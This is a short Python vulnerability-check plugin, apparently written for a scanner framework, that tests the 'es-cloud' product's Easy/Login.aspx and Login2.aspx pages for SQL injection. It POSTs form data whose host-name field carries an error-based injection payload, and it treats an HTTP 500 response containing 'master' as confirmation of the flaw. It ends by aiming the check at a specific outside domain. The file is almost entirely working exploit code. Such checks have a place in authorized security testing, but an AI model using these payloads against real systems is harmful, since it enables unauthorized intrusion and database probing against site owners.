#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107850


def assign(service, arg):
    if service == "es-cloud":
        return True, arg
        
        
        
def audit(arg): 
    payloads = ['Easy/Login.aspx','Easy/Login2.aspx']
    postdata = {
        payloads[0] :   '__VIEWSTATE=/wEPDwUKMTMyNjA3OTI4OGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFC2xvZ2luc3VibWl0&txtHostName=%27%20and%20db_name%281%29%3E1--&txtUserName=&txtUserPwd=&loginsubmit.x=41&loginsubmit.y=25',
        payloads[1] :'__VIEWSTATE=/wEPDwULLTEzNDYxNTQ5ODZkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQtsb2dpbnN1Ym1pdA==&txtHostName1=&txtUserName1=&txtUserPwd1=&txtHostName=%27%20and%20db_name%281%29%3E1--&txtUserName=&txtUserPwd=&loginsubmit.x=108&loginsubmit.y=26'
        }
    for payload in payloads:
        url = arg + payload 
        code, head, res, errcode1, _ = curl.curl2(url,postdata[payload])
        if code == 500 and 'master' in res :
            security_hole(arg+payload)
        
     
    



if __name__ == '__main__':
    from dummy import *
    audit(assign('es-cloud','http://leaders56.com/')[1])